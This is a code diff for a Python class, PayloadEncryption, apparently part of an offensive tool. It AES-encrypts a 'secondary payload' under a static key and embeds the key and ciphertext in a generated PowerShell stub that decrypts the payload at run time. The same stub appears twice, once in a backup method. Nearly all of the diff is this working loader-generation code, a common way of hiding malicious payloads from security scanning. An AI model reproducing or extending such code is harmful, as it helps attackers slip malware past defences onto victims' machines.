@@ -12,8 +12,12 @@ from Crypto.Random import get_random_bytes
 class PayloadEncryption():
     # TODO: The remaining client-side code should be bundled in here before finalising the 0.5.6 release
 
-    @staticmethod
-    def encrypt_with_static_aes(payload):
+    def payload_encryption(self, raw_payload):
+        encrypted_payload = self.encrypt_with_static_aes(raw_payload)
+        finalised_payload  = self.payload_decryption_wrapper(encrypted_payload)
+        return finalised_payload
+
+    def encrypt_with_static_aes(self, payload):
         # Responsible for encrypting the secondary payload using a static key.
         # Returns a dict with IV, Ciphertext and Key, all as base64 values.
         # These can then be inserted into the client-side decryption routine.
@@ -25,3 +29,100 @@ class PayloadEncryption():
         key = b64encode(key).decode('utf-8')
         result = {'key': key, 'iv': iv, 'ciphertext': ct}
         return result
+
+
+    def payload_decryption_wrapper(self, encrypted_payload):
+        try:
+            powershell_decryption = f'''
+function Create-AesManagedObject($key, $IV) {{
+    $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+    $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+    $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+    $aesManaged.BlockSize = 128
+    $aesManaged.KeySize = 256
+    if ($IV) {{
+        if ($IV.getType().Name -eq "String") {{
+            $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+        }}
+        else {{
+            $aesManaged.IV = $IV
+        }}
+    }}
+    if ($key) {{
+        if ($key.getType().Name -eq "String") {{
+            $aesManaged.Key = [System.Convert]::FromBase64String($key)
+        }}
+        else {{
+            $aesManaged.Key = $key
+        }}
+    }}
+    $aesManaged
+}}
+
+function dcc($key, $iv, $ct){{
+    $byte_ct = [System.Convert]::FromBase64String($ct)
+    $bytes = [System.Convert]::FromBase64String($ct)
+    $aesManaged = Create-AesManagedObject $key $iv
+    $decryptor = $aesManaged.CreateDecryptor();
+    $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+    $aesManaged.Dispose()
+    $unencryptedData.GetType()
+    $a = [System.Text.Encoding]::UTF8.GetString($unencryptedData) #.Trim([char]0)
+    $a
+}}
+$key = "{encrypted_payload['key']}" 
+$ct = "{encrypted_payload['ciphertext']}"
+$iv = "{encrypted_payload['iv']}"
+$ggwp = dcc $key $iv $ct        
+            '''
+            return powershell_decryption
+        except:
+            return
+
+    def BACKUP_payload_decryption_wrapper(self, encrypted_payload):
+            try:
+                powershell_decryption = f'''
+    function Create-AesManagedObject($key, $IV) {{
+        $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
+        $aesManaged.BlockSize = 128
+        $aesManaged.KeySize = 256
+        if ($IV) {{
+            if ($IV.getType().Name -eq "String") {{
+                $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+            }}
+            else {{
+                $aesManaged.IV = $IV
+            }}
+        }}
+        if ($key) {{
+            if ($key.getType().Name -eq "String") {{
+                $aesManaged.Key = [System.Convert]::FromBase64String($key)
+            }}
+            else {{
+                $aesManaged.Key = $key
+            }}
+        }}
+        $aesManaged
+    }}
+
+    function dcc($key, $iv, $ct){{
+        $byte_ct = [System.Convert]::FromBase64String($ct)
+        $bytes = [System.Convert]::FromBase64String($ct)
+        $aesManaged = Create-AesManagedObject $key $iv
+        $decryptor = $aesManaged.CreateDecryptor();
+        $unencryptedData = $decryptor.TransformFinalBlock($bytes, 0, $bytes.Length);
+        $aesManaged.Dispose()
+        $unencryptedData.GetType()
+        $a = [System.Text.Encoding]::UTF8.GetString($unencryptedData) #.Trim([char]0)
+        $a
+    }}
+    $key = "{encrypted_payload['key']}" 
+    $ct = "{encrypted_payload['ciphertext']}"
+    $iv = "{encrypted_payload['iv']}"
+    $ggwp = dcc $key $iv $ct        
+                '''
+                return powershell_decryption
+            except:
+                return
